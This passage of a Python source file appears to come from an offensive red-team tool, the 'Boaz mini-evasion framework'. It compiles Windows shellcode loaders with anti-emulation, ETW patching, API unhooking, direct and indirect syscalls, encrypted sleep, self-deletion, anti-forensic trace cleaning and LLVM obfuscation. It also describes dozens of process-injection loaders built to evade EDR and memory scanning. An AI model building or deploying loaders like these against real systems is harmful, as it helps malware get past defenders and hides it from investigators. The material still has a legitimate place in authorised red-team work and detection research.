            if god_speed:
                # Ensure ExecuteProcessOperations(); is placed right after executeAllChecksAndEvaluate(); if both flags are set
                function_calls += f"{indentation}ExecuteProcessOperations();\n"
            content = content[:next_line_start] + function_calls + content[next_line_start:]
  

    # Existing logic for inserting performSweetSleep(); remains unchanged...
    if sleep_flag:
        # Ensure #include "sweet_sleep.h" is added at the top of the file
        if '#include "sweet_sleep.h"' not in content:
            content = '#include "sweet_sleep.h"\n' + content

        # Use a regular expression to find the opening brace of the main function
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = match.end()
            newline_pos = content.find('\n', insert_pos)
            if newline_pos != -1:
                next_line_start = newline_pos + 1
                next_line_end = content.find('\n', next_line_start)
                next_line_content = content[next_line_start:next_line_end]
                indentation_match = re.match(r'\s*', next_line_content)
                indentation = indentation_match.group(0) if indentation_match else ''
                sleep_call_with_indentation = f"{indentation}performSweetSleep();\n"
                # Ensure sleep call is added after anti-emulation call if both flags are set
                content = content[:next_line_start] + sleep_call_with_indentation + content[next_line_start:]


    # If self-deletion is enabled, insert the self-deletion logic TODO: 
    if self_deletion:
        content = insert_self_deletion(content)

    if anti_forensic: 
        content = insert_anti_forensic(content)


    # Write to the new loader file
    with open(output_path, 'w') as file:
        file.write(content)


def run_obfuscation(loader_path):

    obf_file = loader_path.replace('.c', '_obf.c')
    patch_file = loader_path + '.patch' 

    try:
        run_cmd(['sudo', 'bash', './obfuscate/obfuscate_file.sh', loader_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # subprocess.run(['sudo', 'bash', './obfuscate/obfuscate_file.sh', loader_path], check=True)
        # Check if the patch file exists and rename it to obf_file
        if os.path.exists(patch_file):
            os.rename(patch_file, obf_file)
        else:
            print(f"Expected patch file not found: {patch_file}. Obfuscation may have failed.")
    except subprocess.CalledProcessError as e:
        print(f"[*] Some Obfuscation steps have not completed with {e}. But do not worry, proceeding with the next steps.")
        # Since obf_file is now defined outside of the try block, it can be safely used here
        if os.path.exists(patch_file):
            os.rename(patch_file, obf_file)


def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulation, insert_junk_api_calls, api_unhooking=False, mllvm_options=None, god_speed=False, encoding=None, loader_number=1, dream=None, etw=False, compile_as_dll=False, compile_as_cpl = False, self_deletion=False, anti_forensic=False, cfg=False, icon=False):

    
    # Find the latest MinGW directory
    mingw_dir_command = "ls -d /usr/lib/gcc/x86_64-w64-mingw32/*-win32 | sort -V | tail -n 1"
    mingw_dir = subprocess.check_output(mingw_dir_command, shell=True, text=True).strip()

    if not mingw_dir:
        print("Error: No x86_64-w64-mingw32 directory found.")
        sys.exit(1)

    print(f"Using MinGW directory: {mingw_dir} \n")


    if not mingw_dir:
        print("Error: No x86_64-w64-mingw32 directory found.")
        sys.exit(1)

    if loader_number in [1, 39, 40, 41, 66]:
        try:
            subprocess.run(['nasm', '-f', 'win64', 'assembly.asm', '-o', 'assembly.o'], check=True)
            print("[+] NASM assembly compilation successful.")
        except subprocess.CalledProcessError as e:
            print(f"[-] NASM assembly compilation failed: {e}")
            return  # Exit the function if NASM compilation fails
    if loader_number in [79]: 
        try:
            subprocess.run(['nasm', '-f', 'win64', 'allocate.asm', '-o', 'assembly.o'], check=True)
            print("[+] NASM assembly compilation successful.")
        except subprocess.CalledProcessError as e:
            print(f"[-] NASM assembly compilation failed: {e}")
            return  # Exit the function if NASM compilation fails
    if loader_number in [29, 30, 34, 36]:
        asm_file = 'direct_syscall.asm' if loader_number == 30 else 'edr_syscall_1.asm' if loader_number == 34 else 'edr_syscall_2.asm' if loader_number == 36 else 'indirect_syscall.asm'
        try:
            subprocess.run(['nasm', '-f', 'win64', asm_file, '-o', 'assembly.o'], check=True)
            print(f"[+] NASM compilation of '{asm_file}' successful.")
        except subprocess.CalledProcessError as e:
            print(f"[-] NASM compilation of '{asm_file}' failed: {e}")
            return
    if loader_number in [50]:
        try:
            subprocess.run(['nasm', '-f', 'win64', 'woodpecker_assm.asm', '-o', 'assembly.o'], check=True)
            print("[+] NASM assembly compilation successful.")
        except subprocess.CalledProcessError as e:
            print(f"[-] NASM assembly compilation failed: {e}")
            return  # Exit the function if NASM compilation fails        
    if not output_name:
        raise ValueError("output_name is empty. Please provide a valid output name.")
    
    # Ensure output_name has a path
    if not os.path.dirname(output_name):
        output_name = "./" + output_name
        
    output_dir = os.path.dirname(output_name)
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    if compiler == "mingw":
        compile_command = ['x86_64-w64-mingw32-g++', '-I.', '-I./converter', '-I./evader', loader_path]
        if compile_as_dll:
            compile_command.append('-shared')
            compile_command.append('-lntdll')
        elif compile_as_cpl:
            compile_command.append('-shared')
        compile_command.extend(['-o', output_name])
    elif compiler == "pluto":
        # Default LLVM passes for Pluto, if any, can be specified here
        mllvm_passes = ','.join(mllvm_options) if mllvm_options else ""
        # compile_command = ['./llvm_obfuscator_pluto/bin/clang++', '-O3', '-flto', '-fuse-ld=lld',
        #                    '-mllvm', f'-passes={mllvm_passes}',
        #                    '-Xlinker', '-mllvm', '-Xlinker', '-passes=hlw,idc',
        #                    '-target', 'x86_64-w64-mingw32', loader_path,
        #                    '-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32',
        #                    '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/']
        compile_command = ['./llvm_obfuscator_pluto/bin/clang++', '-I.', '-I./converter', '-I./evader', '-O1', '-flto', '-fuse-ld=lld',
                        '-mllvm', f'-passes={mllvm_passes}',
                        '-Xlinker', '-mllvm', '-Xlinker', '-passes=hlw,idc',
                        '-target', 'x86_64-w64-mingw32', '-I.', '-I./converter', '-I./evader', loader_path]
        if compile_as_dll:
            compile_command.append('-shared')
            compile_command.append('-lntdll')
            output_name = output_name.replace('.exe', '.dll')
        elif compile_as_cpl:
            compile_command.append('-shared')
            output_name = output_name.replace('.exe', '.cpl')
        compile_command.extend(['-o', output_name, '-v', f'-L{mingw_dir}',
                                '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/'])
    elif compiler == "akira":

        
        # Default LLVM options for Akira
        # default_akira_options = ['-irobf-indbr', '-irobf-icall', '-irobf-indgv', '-irobf-cse', '-irobf-cff']
        # akira_options = mllvm_options if mllvm_options else default_akira_options
        # compile_command = ['./akira_built/bin/clang++', '-target', 'x86_64-w64-mingw32', loader_path, '-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32', '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/']
        # for option in akira_options:
        #     compile_command.extend(['-mllvm', option])
        default_akira_options = ['-irobf-indbr', '-irobf-icall', '-irobf-indgv', '-irobf-cse', '-irobf-cff']
        akira_options = mllvm_options if mllvm_options else default_akira_options
        compile_command = ['./akira_built/bin/clang++', '-I.', '-I./converter', '-I./evader', '-target', 'x86_64-w64-mingw32', '-I.', '-I./converter', '-I./evader', loader_path]
        if compile_as_dll:
            compile_command.append('-shared')
            compile_command.append('-lntdll')
            output_name = output_name.replace('.exe', '.dll')
        elif compile_as_cpl:
            compile_command.append('-shared')
            output_name = output_name.replace('.exe', '.cpl')
        compile_command.extend(['-o', output_name, '-v', f'-L{mingw_dir}',
                                '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/'])
        for option in akira_options:
            compile_command.extend(['-mllvm', option])

    if anti_emulation:
        compile_command.extend(['./evader/anti_emu.c', '-lws2_32', '-lpsapi'])
    if etw:
        compile_command.append('./evader/etw_pass.c')
    ## TODO: Add support for other encoding types
    if encoding == 'uuid':
        compile_command.append('./converter/uuid_converter.c')
    elif encoding == 'xor':
        compile_command.append('./converter/xor_converter.c')
    elif encoding == 'mac':
        compile_command.append('./converter/mac_converter.c')
    elif encoding == 'ipv4':
        compile_command.append('./converter/ipv4_converter.c')
    elif encoding == 'base45':
        compile_command.append('./converter/base45_converter.c')
    elif encoding == 'base64':
        compile_command.append('./converter/base64_converter.c')
    elif encoding == 'base58':
        compile_command.append('./converter/base58_converter.c')
    elif encoding == 'aes': 
        compile_command.append('./converter/aes_converter.c')
    elif encoding == 'chacha':
        compile_command.append('./converter/chacha_converter.c')
    elif encoding == 'rc4':
        compile_command.append('./converter/rc4_converter.c')
    elif encoding == 'aes2':
        compile_command.append('./converter/aes2_converter.c')
    elif encoding == 'des':
        compile_command.append('./converter/des_converter.c')
    elif encoding == 'ascon':
        compile_command.append('./converter/ascon_converter.c')
    if dream:
        compile_command.append('./evader/sleep_encrypt.c')
    if god_speed:
        compile_command.append('./evader/god_speed.c')
    if sleep_flag:
        compile_command.append('./evader/sweet_sleep.c')
    if insert_junk_api_calls:
        compile_command.append('./evader/normal_api.c')
    if api_unhooking:
        compile_command.append('./evader/api_untangle.c')
    if self_deletion:
        compile_command.append('./evader/self_deletion.c')
    if anti_forensic:
        compile_command.append('./evader/anti_forensic.c')
    compile_command.append('-static-libgcc')
    compile_command.append('-static-libstdc++')
    compile_command.append('-lole32')
    if loader_number == 22:
        compile_command.append('-static-libgcc')
        compile_command.append('-static-libstdc++')
        compile_command.append('./indirect_syscall/FuncWrappers.cpp')
        compile_command.append('./indirect_syscall/HookModule.cpp')
        compile_command.append('-I./indirect_syscall/')
    if loader_number == 33: 
        compile_command.append('./syscall.c')
        compile_command.append('assembly.o')
    if loader_number in [1, 29, 30, 34, 36, 39, 40, 41, 50, 66, 79]:

        compile_command.append('assembly.o')
        compile_command.append('-luuid')
    if loader_number in [37, 38, 48, 49, 50, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76, 77, 79]:
        compile_command.append('./evader/pebutils.c')
        # compile_command.append('-lole32')
    # if loader_number == 50:  // for pretext code
    #     compile_command.append('-lshlwapi')
    if cfg:
        compile_command.append('./evader/cfg_patch.c')
    ## add icon.res file to the compilation command
    if icon:
        compile_command.append('icon.res')
        compile_command.append('-mwindows')

        

    try:
        subprocess.run(compile_command, check=True)
        ### suppress output:
        # subprocess.run(compile_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"\033[95m[+] Congratulations!\033[0m The packed binary has been successfully generated: \033[91m{output_name}\033[0m")
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation failed: {e}")


def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_flag, anti_emulation, insert_junk_api_calls, compiler, api_unhooking, god_speed=False, encoding=None, dream=None, etw=False, self_deletion=False, anti_forensic=False, cfg=False):
    # Create output directory if it doesn't exist
    output_dir = os.path.dirname(output_name)
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    common_sources = ['./classic_stubs/syscalls.c', './classic_stubs/syscallsstubs.std.x64.s']
    # Additional source files based on flags
    additional_sources = []
    if anti_emulation:
        additional_sources.extend(['./evader/anti_emu.c', '-lws2_32', '-lpsapi', '-lole32'])
    if self_deletion:
        additional_sources.append('./evader/self_deletion.c')
    if anti_forensic:
        additional_sources.append('./evader/anti_forensic.c')
    if cfg:
        additional_sources.append('./evader/cfg_patch.c')
    if etw:
        additional_sources.append('./evader/etw_pass.c')
    ## TODO: Add support for other encoding types
    if encoding:
        if encoding == 'uuid':
            additional_sources.append('./converter/uuid_converter.c')
        elif encoding == 'xor':
            additional_sources.append('./converter/xor_converter.c')
        elif encoding == 'mac':
            additional_sources.append('./converter/mac_converter.c')
        elif encoding == 'ipv4':
            additional_sources.append('./converter/ipv4_converter.c')  ### Add IPV6 converter in the future
        elif encoding == 'base45':
            additional_sources.append('./converter/base45_converter.c')
        elif encoding == 'base64':
            additional_sources.append('./converter/base64_converter.c')
        elif encoding == 'base58':
            additional_sources.append('./converter/base58_converter.c')
        elif encoding == 'aes':
            additional_sources.append('./converter/aes_converter.c')
        elif encoding == 'chacha':
            additional_sources.append('./converter/chacha_converter.c')
        elif encoding == 'rc4':
            additional_sources.append('./converter/rc4_converter.c')
        elif encoding == 'aes2':
            additional_sources.append('./converter/aes2_converter.c')
        elif encoding == 'des':
            additional_sources.append('./converter/des_converter.c')
        elif encoding == 'ascon':
            additional_sources.append('./converter/ascon_converter.c')
    if dream:
        additional_sources.append('./evader/sleep_encrypt.c')
    if god_speed:
        additional_sources.append('./evader/god_speed.c')
    if sleep_flag:
        additional_sources.append('./evader/sweet_sleep.c')
    if insert_junk_api_calls:
        additional_sources.append('./evader/normal_api.c')
    if api_unhooking:
        additional_sources.append('./evader/api_untangle.c')
    additional_sources.append('-static-libgcc')
    additional_sources.append('-static-libstdc++')

    if compiler == "akira":
        print("Compiling with Akira...")

        compile_command = ["./akira_built/bin/clang++", '-I.', '-I./converter', '-I./evader', "-D", "nullptr=NULL", "-mllvm", "-irobf-indbr", "-mllvm", "-irobf-icall",
                           "-mllvm", "-irobf-indgv", "-mllvm", "-irobf-cse", "-mllvm", "-irobf-cff", "-target", "x86_64-w64-mingw32",
                           loader_path, "./classic_stubs/syscalls.c", "./classic_stubs/syscallsstubs.std.x64.s", "-o", output_name, "-v",
                           f"-L{mingw_dir}", "-L./clang_test_include", "-I./c++/", "-I./c++/mingw32/"] + additional_sources
        subprocess.run(compile_command, check=True)
    elif compiler == "pluto":
        # Pluto-specific compilation command
        compile_command = ["./llvm_obfuscator_pluto/bin/clang++", '-I.', '-I./converter', '-I./evader', "-fms-extensions", "-D", "nullptr=NULL", "-O1", "-flto", "-fuse-ld=lld",
                           "-mllvm", "-passes=mba,sub,idc,bcf,fla,gle", "-Xlinker", "-mllvm", "-Xlinker", "-passes=hlw,idc",
                           "-target", "x86_64-w64-mingw32", loader_path, "./classic_stubs/syscalls.c", "./classic_stubs/syscallsstubs.std.x64.s", "-o", output_name, "-v",
                           f"-L{mingw_dir}", "-L./clang_test_include", "-I./c++/", "-I./c++/mingw32/"] + additional_sources
        subprocess.run(compile_command, check=True)
    elif syswhisper_option == 1:
        # Random syscall jumps compilation
        print("Compiling with random syscall jumps.....")
        compile_command = ['x86_64-w64-mingw32-g++', '-I.', '-I./converter',  '-I./evader', loader_path, './classic_stubs/syscalls.c', './classic_stubs/syscallsstubs.rnd.x64.s', '-DRANDSYSCALL', '-Wall'] + additional_sources + ['-o', 'temp.exe']
        strip_command = ['x86_64-w64-mingw32-strip', '-s', 'temp.exe', '-o', output_name]
        subprocess.run(compile_command, check=True)
        subprocess.run(strip_command, check=True)
        cleanup_command = ['rm', '-rf', 'temp.exe']
        subprocess.run(cleanup_command, check=True)
        

    elif syswhisper_option == 2:
        # Compiling with MingW and NASM requires a two-step process
        # Find all .o files in the current directory
        object_files = glob.glob('*.o')

        # First, compile C files and syscalls.c with additional sources
        mingw_compile_command = ['x86_64-w64-mingw32-g++', '-I.', '-I./converter', '-I./evader', '-m64', '-c', loader_path, './classic_stubs/syscalls.c'] + ['-Wall', '-shared']
        subprocess.run(mingw_compile_command, check=True)
        print("MingW command executed successfully")
        
        # NASM compilation for the syscall stubs
        nasm_command = ['nasm', '-I.', '-I./converter',  '-I./evader', '-f', 'win64', '-o', 'syscallsstubs.std.x64.o', './classic_stubs/syscallsstubs.std.x64.nasm']
        subprocess.run(nasm_command, check=True)
        print("NASM command executed successfully")

        # Final linking of all objects to create the executable
        # final_link_command = ['x86_64-w64-mingw32-g++', '*.o', '-o', 'temp.exe'] + additional_sources
        final_link_command = ['x86_64-w64-mingw32-g++', '-I.', '-I./converter', '-I./evader'] + object_files + ['-o', 'temp.exe'] + additional_sources
        subprocess.run(final_link_command, check=True)
        print("Final link command executed successfully")
        
        # Stripping the executable
        strip_command = ['x86_64-w64-mingw32-strip', '-s', 'temp.exe', '-o', output_name]
        subprocess.run(strip_command, check=True)
        print("Strip command executed successfully")
        
        # Cleanup temporary files
        cleanup_command = ['rm', '-rf', 'temp.exe'] + object_files
        subprocess.run(cleanup_command, check=True)
    else:
        raise ValueError("Invalid SysWhisper option provided.")

    # Success message
    print(f"\033[95m[+] Congratulations!\033[0m The packed binary has been successfully generated with SysWhisper integration: \033[91m{output_name}\033[0m")

def strip_binary(binary_path):
    """
    Strips all symbols from the binary to reduce its size and potentially increase its stealth.

    Args:
    binary_path (str): Path to the compiled binary to be stripped.
    """
    try:
        subprocess.run(['strip', '--strip-all', binary_path], check=True)
        print(f"\033[92m[+] Successfully stripped the binary: {binary_path} \033[0m")
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to strip the binary {binary_path}: {e}")

def add_watermark(output_file_path):
    watermark_command = f"python3 Watermarker.py {output_file_path} -s boaz,boaz"
    subprocess.run(watermark_command, shell=True, check=True, stdout=subprocess.DEVNULL)

### Add function to run commands 'python3 obfuscate/update_config.py' and then run 'wine obfuscate/obf_api.exe ~/alice_evasion/Bob-and-Alice/alice_notepad.exe output_file obfuscate/config.ini'
# def obfuscate_with_api(output_file_path):
#     # Update the config.ini file with the new output file path
#     update_config_command = "python3 obfuscate/update_config.py"
#     subprocess.run(update_config_command, shell=True, check=True, stdout=subprocess.DEVNULL)

#     # Run the obfuscation tool with the updated config.ini file
#     obfuscate_command = f"wine obfuscate/obf_api.exe {output_file_path} {output_file_path} obfuscate/config.ini"
#     subprocess.run(obfuscate_command, shell=True, check=True, stdout=subprocess.DEVNULL)
def obfuscate_with_api(output_file_path):
    update_config_command = "python3 obfuscate/update_config.py"
    subprocess.run(update_config_command, shell=True, check=True, stdout=subprocess.DEVNULL)

    # Create a temporary output file path
    temp_output_file_path = output_file_path + ".temp"

    # Run the obfuscation tool with the updated config.ini file using the temporary file
    obfuscate_command = f"wine obfuscate/obf_api.exe {output_file_path} {temp_output_file_path} obfuscate/config.ini"
    subprocess.run(obfuscate_command, shell=True, check=True, stdout=subprocess.DEVNULL)

    shutil.move(temp_output_file_path, output_file_path)
    print(f"\033[92m[+] Successfully obfuscated the binary API: {output_file_path} \033[0m")
    # Ensure the temp file is deleted if it exists
    if os.path.exists(temp_output_file_path):
        os.remove(temp_output_file_path)
    


def cleanup_files(*file_paths):
    """Deletes specified files or dirs to clean up."""
    for file_path in file_paths:
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
                # print(f"Deleted temporary file: {file_path}")
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
                # print(f"Deleted directory: {file_path}")
        except OSError as e:
            print(f"Error deleting temporary file {file_path}: {e}")
            print(f"File may not exists.")


def compile_unhook_iat():
    print("[*] Compiling check_hooks.exe...")
    cmd = [
        "x86_64-w64-mingw32-g++",
        "-o", "./check_hooks.exe",
        "./hook_detection/check_hooks.c",
        "-static",
        "-static-libgcc",
        "-static-libstdc++",
        "-ldbghelp",
        "-ladvapi32"
    ]
    try:
        subprocess.run(cmd, check=True)
        print("[+] Compilation completed: ./check_hooks.exe")
    except subprocess.CalledProcessError as e:
        print(f"[!] Compilation failed: {e}")


        


def main():

    # ANSI escape code for cyan text (approximation of Cambridge blue)
    start_color_cyan = "\033[0;36m"
    # ANSI escape code for magenta text (purple)
    start_color_magenta = "\033[0;35m"
    # ANSI reset code to revert to default terminal color
    reset_color = "\033[0m"
    print(start_color_cyan + """


    ╭━━╮╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
    ┃╭╮┃╱╱╱╱╱╱╱╱╱╱╱┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
    ┃╰╯╰┳━━┳━━┳━━━╮┃╰━━┳╮╭┳━━┳━━┳┳━━┳━╮╱╰╯┃┃┣┻━┳━━┫┃
    ┃╭━╮┃╭╮┃╭╮┣━━┃┃┃╭━━┫╰╯┃╭╮┃━━╋┫╭╮┃╭╮╮╱╱┃┃┃╭╮┃╭╮┃┃
    ┃╰━╯┃╰╯┃╭╮┃┃━━┫┃╰━━╋╮╭┫╭╮┣━━┃┃╰╯┃┃┃┃╱╱┃┃┃╰╯┃╰╯┃╰╮
    ╰━━━┻━━┻╯╰┻━━━╯╰━━━╯╰╯╰╯╰┻━━┻┻━━┻╯╰╯╱╱╰╯╰━━┻━━┻━╯

                                                            
    .@@@@@@&%#%                                             
    .@@@@@@@%#(                                             
    #@@@@@@@&#((                                            
   @@@@@@@@@&&%%%                                           
    %#%%@@@@%(/*,                               ..          
    %**,,,,*****.                          #%##((////(.     
     .//***//*/                          ,%%%##(((((((#(    
   .%&%%/,,,**(#%&,                       */(##########%.   
  &@@@&&%(//   *%&@#                      ********/%%%%%    
 &@@@&%%&%(/   *%&@&,.                     *//////#&&&&#    
.@@@&&%##&%#(/ /&&&&*.                  .*  ***/(#&&&#      
 @@@@&&%%%%&&%%%&&*               ((  .(    /***.   .,,*    
   *%&&&&&%#/,                    .//,(((/(%#/(.**,.*,,,*,  
                                 /**,,/(((#&&&%, *%*******. 
                                 ,//*/%(((%&(// ....,/**//. 
                                       (*((((/////////////. 
                                              .,*//**,                                                                                 
                                                                                

          
    """ + reset_color)
    print(start_color_magenta + "Boaz mini-evasion framework is starting...\n" + reset_color)

    time.sleep(0.5)  # Sleeps for 2 seconds


    # Extended description for loaders
    loaders_description = """
    loader modules:
    1.  Proxy syscall --> Custom call Stack + indirect syscall with threadless execution (local injection)
    2.  APC test alert
    3.  Sifu syscall
    4.  UUID manual injection
    5.  Remote mockingJay
    6.  Local thread hijacking 
    7.  Function pointer invoke local injection
    8.  Ninja_syscall2 
    9.  RW local mockingJay
    10. Ninja syscall 1
    11. Sifu Divide and Conquer syscall
    12. [Your custom loader here]
    14. Exit the process without executing the injected shellcode
    15. Syswhispers2 classic native API calls
    16. Classic userland API calls (VirtualAllcEx --> WriteProcessMemory --> CreateRemoteThread)
    17. Sifu SysCall with Divide and Conquer
    18. Classic userland API calls with WriteProcessMemoryAPC
    19. DLL overloading 
    20. Stealth new Injection (WriteProcessMemoryAPC + DLL overloading)
    21.
    22. Advanced indirect custom call stack syscall, using VEH-->VCH logic and manually remove handlers from the list.
    23.
    24. Classic native API 
    25.
    26. Stealth new Injection (3 WriteProcessMemoryAPC variants + custom DLL overloading + custom dynamic API-hashing)
    27. Stealth new Injection (3 Custom WriteProcessMemoryAPC variants + custom DLL overloading + custom dynamic API-hashing + Halo's gate patching)
    28. Halo's gate patching syscall injection + Custom write code to Process Memory by either MAC or UUID convertor + invisible dynamic loading (no loadModuleHandle, loadLibrary, GetProcessAddress)
    29. Classic indirect syscall
    30. Classic direct syscall
    31. MAC address injection
    32. Stealth new injection (Advanced)
    33. Indirect Syscall + Halo gate + Custom Call Stack
    34. EDR syscall no.1 + Halo gate + EDR Call Stack 1
    36. EDR syscall no.2 + Halo gate + EDR Call Stack 2 
    37. Stealth new loader (Advanced, evade memory scan)
    38. A novel PI with APC write method and phantom DLL overloading execution (CreateThread pointed to a memory address of UNMODIFIED DLL.)
    39. Custom Stack PI (remote) with threadless execution
    40. Custom Stack PI (remote) Threadless DLL Notification Execution
    41. Custom Stack PI (remote) with Decoy code execution
    48. Stealth new loader + Syscall breakpoints handler with memory guard AKA Sifu breakpoint handler (hook on NtResumeThread)
    49. Stealth new loader + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on NtCreateThreadEx, with Decoy address, PAGE_NOACCESS and XOR)
    50. Woodpecker process injection, tactics similar to Kenshin-ko.  Focused on classification evasion. 
    51. Stealth new loader + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
    52. RoP gadgets as the trampoline code to execute the magic code. 
    53.
    54. Stealth new loader + Exception handler + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
    56. This is a fork of Loader 37 with additional features. If -ldr flag is not provided, loader will add module (contains the shellcode) to the PEB module lists manually using code from Dark library. 
    57. A fork of loader 51 with XOR replaced with RC4 encryption offered by SystemFunction032/033.
    58. VEH add hanlder. Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse. 
    59. SEH add hanlder. Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse.
    60. Use Page guard to trigger first exception to set debug registers without using NtGetContextThread --> NtSetContextThread
    61. Use Page guard to trigger first exception to set debug registers without using NtGetContextThread --> NtSetContextThread + Use VEH to set up breakpoints Dr0~Dr3, Dr7. Then use VCH to execute the code. So, no registers and stack pointer and instruction pointer changed in VEH. 
    62. New loader in progress.
    63. Remote version of custom module loading loader 37. Remote module injection.
    64.
    65. Advanced VMT hooking with custom module loader 37. 
    66. A fork of L-65, with additional features such as optional PPID spoofing, multiple shellcode and DLL injection mitigation policies enabled on remote process.
    67. A fork of L-65, with strange trampoline code to execute the magic code in both local and remote process. 
    68. New loader in progress.
    69. A fork of L-61, manually set VEH and VCH and clean ups by remove the CrossProcessFlags from TEB->PEB.
    ...
    73. VT Pointer threadless process injection, can be invoked with decoy address to any function or triggered by injected application (e.g. explorer). Memory guard available with RC4 encryption and PAGE_NOACCESS.
    74. VT Pointer threadless process injection, can be invoked with decoy address to any function or triggered by injected application (e.g. explorer). Memory guard available with RC4 encryption and PAGE_NOACCESS. The VirtualProtect is being called within pretext.

    75. Dotnet JIT threadless process injection. 
    76. Module List PEB Entrypoint threadless process injection. 
    77. VT Pointer threadless process injection. Use RtlCreateHeap instead of BaseThreadInitThunk virtual table pointer.
    79. Proxy function call stub 2 step process injection: Kagemusha PI. Only CreateThread is called without explicitly call to Write primitive. 

     """

    def check_non_negative(value):
        ivalue = int(value)
        if ivalue < 0:
            raise argparse.ArgumentTypeError("%s is an invalid non-negative int value" % value)
        return ivalue

    def print_selected_options(args):
        for arg, value in vars(args).items():
            if value is not None and value is not False:
                print(f"[+] Option \033[95m'{arg}'\033[0m is selected with argument:\033[91m {value} \033[0m")
                
    parser = argparse.ArgumentParser(
        description='Process loader and shellcode.',
        epilog=loaders_description,
        formatter_class=argparse.RawDescriptionHelpFormatter 
    )

    parser.add_argument('-f', '--input-file', required=False, help='Path to binary.exe')
    parser.add_argument('-o', '--output-file', help='Optional: Specify the output file path and name. If not provided, a random file name will be used in the ./output directory.')

    parser.add_argument('-divide', action='store_true', help='Divide flag (True or False)')
    parser.add_argument('-l', '--loader', type=check_non_negative, default=1, help='Loader number (must be a non-negative integer)')
    parser.add_argument('-dll', action='store_true', help='Compile the output as a DLL instead of an executable, can be run with rundll32.exe')
    parser.add_argument('-cpl', action='store_true', help='Compile the output as a CPL instead of an executable, can be run with control.exe')


    parser.add_argument('-sleep', action='store_true', help='Obfuscation Sleep flag with random sleep time (True or False)')
    parser.add_argument('-a', '--anti-emulation', action='store_true', help='Anti-emulation flag (True or False)')

    parser.add_argument('-cfg', '--control-flow-guard', action='store_true', help='Disable Control Flow Guard (CFG) for the loader template.')


    parser.add_argument('-etw', action='store_true', help='Enable ETW patching functionality')

    parser.add_argument('-j', '--junk-api', action='store_true', help='Insert junk API function call at a random location in the main function (5 API functions)')

    parser.add_argument('-dream', type=int, nargs='?', const=1500, default=None,
                        help='Optional: Sleep with encrypted stacks for specified time in milliseconds. Defaults to 1500ms if not provided.')


    parser.add_argument('-u', '--api-unhooking', action='store_true', help='Enable API unhooking functionality')
    parser.add_argument('-g', '--god-speed', action='store_true', help='Enable advanced unhooking technique Peruns Fart (God Speed)')

    parser.add_argument('-t', '--shellcode-type', default='donut', choices=['donut', 'pe2sh', 'rc4', 'amber', 'shoggoth', 'augment'], help='Shellcode generation tool: donut (default), pe2sh, rc4, amber, shoggoth or augmented loader')
    parser.add_argument('-sd', '--star_dust', action='store_true', help='Enable Stardust PIC generator, input should be .bin')


    parser.add_argument('-sgn', '--encode-sgn', action='store_true', help='Encode the generated shellcode using sgn tool.')

    ## TODO: Add support for other encoding types
    parser.add_argument('-e', '--encoding', choices=['uuid', 'xor', 'mac', 'ipv4', 'base45', 'base64', 'base58', 'aes', 'des', 'chacha', 'rc4', 'aes2', 'ascon'], help='Encoding type: uuid, xor, mac, ip4, base45, base64, base58, AES, DES, chacha, RC4 and aes2. aes2 is a devide and conquer AES decryption to bypass logical path hijacking. Other encoders are under development. ')


    parser.add_argument('-c', '--compiler', default='mingw', choices=['mingw', 'pluto', 'akira'], help='Compiler choice: mingw (default), pluto, or akira')
    parser.add_argument('-mllvm', type=lambda s: [item.strip() for item in s.split(',')], default=None, help='LLVM passes for Pluto or Akira compiler')
    parser.add_argument('-obf', '--obfuscate', action='store_true', help='Enable obfuscation of codebase (source code)')
    # add obf_api option to obfuscate the API calls:
    parser.add_argument('-obf_api', '--obfuscate-api', action='store_true', help='Enable obfuscation of API calls in ntdll and kernel32.')

    parser.add_argument('-w', '--syswhisper', type=int, nargs='?', const=1, default=None,
                        help='Optional: Use SysWhisper for direct syscalls. 1 for random syscall jumps (default), 2 for compiling with MingW and NASM.')

    parser.add_argument('-entropy', type=int, choices=[1, 2], default=0, help='Entropy level for post-processing the output binary. 1 for null_byte.py, 2 for pokemon.py')
    parser.add_argument('-b', '--binder', nargs='?', const='binder/calc.exe', help='Optional: Path to a utility for binding. Defaults to binder/calc.exe if not provided.')


    ## add a new option that adds watermark to our binary, this is true by default if not specified:
    parser.add_argument('-wm', '--watermark', type=int, nargs='?', const=1, default=1, help='Add watermark to the binary (0 for False, 1 or no value for True)')

    ## TODO: 
    ### need a -d --self-deletion argument where the binary deletes itself after execution, it should be False by default:
    parser.add_argument('-d', '--self-deletion', action='store_true', help='Enable self-deletion of the binary after execution')

    ### need a -af --anti-forensic argument, it should be False by default:
    parser.add_argument('-af', '--anti-forensic', action='store_true', help='Enable anti-forensic functions to clean the execution traces.')
    parser.add_argument('-icon', action='store_true', help='Enable icon for the output binary.')


